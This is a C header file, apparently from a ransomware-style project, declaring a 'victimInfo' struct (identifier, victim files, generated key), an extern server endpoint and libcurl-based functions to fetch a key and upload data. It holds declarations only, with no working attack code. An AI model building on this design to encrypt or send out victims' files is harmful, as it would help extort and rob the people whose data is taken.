#ifndef NETWORK
#define NETWORK

#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include "FileNode.h"

typedef struct victimInfo{

    char *identifier;
    FileNodes victimFiles;
    char *generatedKey;

}victimInfo;

const extern char endpoint[];

char* initAndGetKey();
int upload(char *url, char *data);

#endif